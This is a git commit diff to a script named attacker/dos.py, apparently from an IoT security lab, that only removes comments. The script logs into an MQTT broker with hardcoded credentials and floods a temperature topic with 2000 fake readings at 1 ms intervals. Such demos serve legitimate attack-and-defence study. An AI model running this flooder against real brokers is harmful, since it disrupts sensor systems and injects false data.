5e9748ed86e10ce2d67f851e1f2be04fb9a00cda
JTaylor <67885009+JTaylor-Code@users.noreply.github.com>
2025-04-30 14:44:18 -0400

    Update dos.py

--- attacker/dos.py
+++ attacker/dos.py
@@ -6,15 +6,15 @@ PORT = 1883
 TOPIC = 'sensor/temperature'
 
 client = mqtt.Client(client_id='flooder')
-client.username_pw_set('sensor', 'password')  # Using valid creds
+client.username_pw_set('sensor', 'password') 
 client.connect(BROKER, PORT, 60)
 client.loop_start()
 
-for i in range(2000):  # send 2000 fast messages
+for i in range(2000): 
 	payload = f"FAKE_TEMP {i}"
 	client.publish(TOPIC, payload)
 	print(f"[FLOOD] Sent {payload}")
-	time.sleep(0.001)  # 1 ms between messages
+	time.sleep(0.001)  
 
 client.loop_stop()
 client.disconnect()
